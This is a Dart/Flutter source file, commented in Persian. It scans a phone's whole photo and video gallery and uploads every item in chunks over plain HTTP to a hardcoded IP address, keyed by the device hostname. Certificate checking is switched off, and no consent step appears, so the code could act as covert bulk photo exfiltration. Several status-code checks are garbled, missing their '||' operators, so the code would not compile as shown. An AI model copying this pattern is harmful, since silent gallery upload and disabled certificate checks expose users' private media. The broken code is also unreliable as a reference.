import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:path_provider/path_provider.dart';
import 'package:sqflite/sqflite.dart';
import 'package:path/path.dart';

const String galleryUrl = 'http://194.48.198.154:8080';
const int chunkSize = 6 * 1024 * 1024; // 6MB

http.Client _createHttpClient() {
  final ioClient = HttpClient()
    ..badCertificateCallback =
        (X509Certificate cert, String host, int port) => true;
  return IOClient(ioClient);
}

// ============================================
// دیتابیس محلی
// ============================================
class UploadQueueDB {
  static Database? _db;

  static Future<Database> get database async {
    _db ??= await _initDB();
    return _db!;
  }

  static Future<Database> _initDB() async {
    final dir = await getApplicationDocumentsDirectory();
    final dbPath = join(dir.path, 'upload_queue.db');
    return openDatabase(dbPath, version: 1, onCreate: (db, version) async {
      await db.execute(
        "CREATE TABLE upload_queue ("
        "id INTEGER PRIMARY KEY AUTOINCREMENT,"
        "asset_id TEXT UNIQUE,"
        "file_path TEXT,"
        "file_name TEXT,"
        "total_size INTEGER,"
        "uploaded_bytes INTEGER DEFAULT 0,"
        "status TEXT DEFAULT 'pending',"
        "upload_id TEXT,"
        "mime_type TEXT,"
        "asset_type TEXT,"
        "retries INTEGER DEFAULT 0,"
        "sort_order INTEGER DEFAULT 0,"
        "created_at TEXT"
        ")",
      );
    });
  }

  static Future<void> insertOrIgnore(Map<String, dynamic> data) async {
    final db = await database;
    await db.insert('upload_queue', data,
        conflictAlgorithm: ConflictAlgorithm.ignore);
  }

  // گرفتن یه آیتم و بلافاصله lock کردنش با transaction
  static Future<Map<String, dynamic>?> claimOneItem() async {
    final db = await database;
    return db.transaction((txn) async {
      final rows = await txn.query(
        'upload_queue',
        where: "status = ? AND retries < ?",
        whereArgs: ['pending', 5],
        orderBy: 'sort_order DESC',
        limit: 1,
      );
      if (rows.isEmpty) return null;
      final item = rows.first;
      await txn.update(
        'upload_queue',
        {'status': 'uploading'},
        where: "id = ?",
        whereArgs: [item['id']],
      );
      return item;
    });
  }

  static Future<List<Map<String, dynamic>>> getStuckUploading() async {
    final db = await database;
    return db.query('upload_queue',
        where: "status = ?", whereArgs: ['uploading']);
  }

  static Future<Set<String>> getAllAssetIds() async {
    final db = await database;
    final rows = await db.query('upload_queue', columns: ['asset_id']);
    return rows.map((e) => e['asset_id'] as String).toSet();
  }

  static Future<void> updateStatus(
    int id, String status, {
    int? uploadedBytes,
    String? uploadId,
    bool clearUploadId = false,
    int? retries,
  }) async {
    final db = await database;
    final data = <String, dynamic>{'status': status};
    if (uploadedBytes != null) data['uploaded_bytes'] = uploadedBytes;
    if (clearUploadId) data['upload_id'] = null;
    else if (uploadId != null) data['upload_id'] = uploadId;
    if (retries != null) data['retries'] = retries;
    await db.update('upload_queue', data, where: "id = ?", whereArgs: [id]);
  }

  static Future<void> markCompleted(int id) async {
    final db = await database;
    await db.update('upload_queue', {'status': 'completed'},
        where: "id = ?", whereArgs: [id]);
  }

  static Future<void> updateUploadedBytes(int id, int bytes) async {
    final db = await database;
    await db.update('upload_queue', {'uploaded_bytes': bytes},
        where: "id = ?", whereArgs: [id]);
  }

  static Future<int> getPendingCount() async {
    final db = await database;
    final result = await db.rawQuery(
        "SELECT COUNT(*) as cnt FROM upload_queue WHERE status = 'pending' AND retries < 5");
    return (result.first['cnt'] as int?) ?? 0;
  }

  static Future<int> getCompletedCount() async {
    final db = await database;
    final result = await db.rawQuery(
        "SELECT COUNT(*) as cnt FROM upload_queue WHERE status = 'completed'");
    return (result.first['cnt'] as int?) ?? 0;
  }
}

// ============================================
// اسکن گالری — همیشه کامل
// insertOrIgnore باعث میشه فایل‌های قبلی skip بشن
// فقط فایل‌های جدید اضافه میشن
// ============================================
Future<int> scanGalleryToQueue() async {
  final filterOption = FilterOptionGroup(
    orders: [OrderOption(type: OrderOptionType.createDate, asc: false)],
  );

  final albums = await PhotoManager.getAssetPathList(
    type: RequestType.all,
    filterOption: filterOption,
  );

  if (albums.isEmpty) return 0;

  AssetPathEntity? allAlbum;
  for (final a in albums) {
    if (a.isAll) { allAlbum = a; break; }
  }
  allAlbum ??= albums.first;

  final count = await allAlbum.assetCountAsync;
  if (count == 0) return 0;

  // همه asset ID هایی که توی دیتابیس هستن
  final existingIds = await UploadQueueDB.getAllAssetIds();
  final client = _createHttpClient();
  final deviceId = Platform.localHostname;
  int newItems = 0;
  const pageSize = 50;

  for (int start = 0; start < count; start += pageSize) {
    final end = (start + pageSize < count) ? start + pageSize : count;
    final assets = await allAlbum.getAssetListRange(start: start, end: end);

    // فقط asset هایی که توی دیتابیس نیستن رو پردازش کن
    final newAssets =
        assets.where((a) => !existingIds.contains(a.id)).toList();
    if (newAssets.isEmpty) continue;

    // چک سرور
    final ids = newAssets.map((a) => "asset_id=${a.id}").join("&");
    final serverUploaded = <String>{};
    try {
      final res = await client.get(
        Uri.parse("$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids"),
      ).timeout(const Duration(seconds: 30));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        serverUploaded.addAll(
            (data['uploaded_asset_ids'] as List).cast<String>());
      }
    } catch (_) {}

    for (int i = 0; i < newAssets.length; i++) {
      final asset = newAssets[i];
      if (serverUploaded.contains(asset.id)) continue;

      final file = await asset.originFile ?? await asset.file;
      if (file == null) continue;

      // جدیدترین (start=0) بالاترین sort_order رو داره
      final sortOrder = count - start - i;

      await UploadQueueDB.insertOrIgnore({
        'asset_id': asset.id,
        'file_path': file.path,
        'file_name': asset.title ?? "${asset.id}.jpg",
        'total_size': await file.length(),
        'uploaded_bytes': 0,
        'status': 'pending',
        'upload_id': null,
        'mime_type': asset.mimeType ??
            (asset.type == AssetType.image ? 'image/jpeg' : 'video/mp4'),
        'asset_type': asset.type == AssetType.image ? 'image' : 'video',
        'retries': 0,
        'sort_order': sortOrder,
        'created_at': DateTime.now().toIso8601String(),
      });
      newItems++;
    }

    await Future.delayed(Duration.zero);
  }

  return newItems;
}

// ============================================
// آپلود یک فایل — با transaction lock
// ============================================
Future<bool> processOneItem() async {
  final client = _createHttpClient();

  // stuck → pending
  final stuck = await UploadQueueDB.getStuckUploading();
  for (final item in stuck) {
    await UploadQueueDB.updateStatus(
      item['id'] as int, 'pending',
      retries: (item['retries'] as int) + 1,
    );
  }

  // claim با transaction — جلوگیری از duplicate
  final item = await UploadQueueDB.claimOneItem();
  if (item == null) return false;

  final id = item['id'] as int;
  final assetId = item['asset_id'] as String;
  final filePath = item['file_path'] as String;
  final totalSize = item['total_size'] as int;
  final fileName = item['file_name'] as String;

  try {
    String? uploadId = item['upload_id'] as String?;

    if (uploadId == null) {
      final initRes = await client.post(
        Uri.parse("$galleryUrl/api/gallery/chunked-upload/init/"),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'device_id': Platform.localHostname,
          'asset_id': assetId,
          'file_name': fileName,
          'total_size': totalSize,
          'mime_type': item['mime_type'],
        }),
      ).timeout(const Duration(seconds: 30));

      if (initRes.statusCode == 200) {
        final data = jsonDecode(initRes.body);
        if (data['status'] == 'exists') {
          await UploadQueueDB.markCompleted(id);
          return true;
        }
        uploadId = data['upload_id'] as String;
        await UploadQueueDB.updateStatus(id, 'uploading', uploadId: uploadId);
      } else {
        throw Exception("Init failed: ${initRes.statusCode}");
      }
    }

    final file = File(filePath);
    if (!await file.exists()) {
      await UploadQueueDB.markCompleted(id);
      return true;
    }

    final uploadedBytes = item['uploaded_bytes'] as int? ?? 0;
    final startChunk = uploadedBytes ~/ chunkSize;
    final totalChunks = (totalSize + chunkSize - 1) ~/ chunkSize;

    final reader = file.openSync();
    if (uploadedBytes > 0) reader.setPositionSync(uploadedBytes);

    for (int i = startChunk; i < totalChunks; i++) {
      final remaining = totalSize - (i * chunkSize);
      final currentChunkSize = remaining < chunkSize ? remaining : chunkSize;
      final bytes = reader.readSync(currentChunkSize);

      final req = http.MultipartRequest(
        'POST',
        Uri.parse("$galleryUrl/api/gallery/chunked-upload/chunk/"),
      );
      req.fields['upload_id'] = uploadId!;
      req.fields['chunk_index'] = i.toString();
      req.files.add(http.MultipartFile.fromBytes('chunk', bytes,
          filename: "chunk_$i"));

      final streamedRes =
          await client.send(req).timeout(const Duration(seconds: 120));
      final res = await http.Response.fromStream(streamedRes);

      if (res.statusCode == 400  res.statusCode == 404  res.statusCode == 410) {
        // upload_id روی سرور نیست — از اول init کن
        reader.closeSync();
        await UploadQueueDB.updateStatus(id, 'pending',
            clearUploadId: true, uploadedBytes: 0);
        return true;
      }
      if (res.statusCode != 200) {
        throw Exception("Chunk failed: \${res.statusCode}");
      }

      final chunkData = jsonDecode(res.body);
      await UploadQueueDB.updateUploadedBytes(
          id, chunkData['received_bytes'] as int);
    }
    reader.closeSync();

    final completeRes = await client.post(
      Uri.parse("$galleryUrl/api/gallery/chunked-upload/complete/"),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'upload_id': uploadId}),
    ).timeout(const Duration(seconds: 60));

    if (completeRes.statusCode == 200) {
      await UploadQueueDB.markCompleted(id);
    } else if (completeRes.statusCode == 400  completeRes.statusCode == 404  completeRes.statusCode == 410) {
      // session پاک شده — reset کن و از اول بفرست
      await UploadQueueDB.updateStatus(id, 'pending',
          clearUploadId: true, uploadedBytes: 0);
    } else {
      throw Exception("Complete failed: \${completeRes.statusCode}");
    }

    return true;
  } catch (e) {
    final retries = (item['retries'] as int) + 1;
    await UploadQueueDB.updateStatus(id, 'pending', retries: retries);
    return true;
  }
}

// ============================================
// حلقه آپلود
// ============================================
Future<void> processQueueInForeground({
  void Function(int done, int total)? onProgress,
}) async {
  final total = (await UploadQueueDB.getPendingCount()) +
      (await UploadQueueDB.getCompletedCount());

  while (await processOneItem()) {
    if (onProgress != null) {
      final done = await UploadQueueDB.getCompletedCount();
      onProgress(done, total);
    }
    await Future.delayed(const Duration(milliseconds: 100));
  }
}

// ============================================
// وضعیت sync برای UI
// ============================================
class SyncStatus {
  final bool isRunning;
  final int uploaded;
  final int total;
  final String message;

  const SyncStatus({
    required this.isRunning,
    required this.uploaded,
    required this.total,
    required this.message,
  });

  double get progress => total == 0 ? 0 : uploaded / total;
}
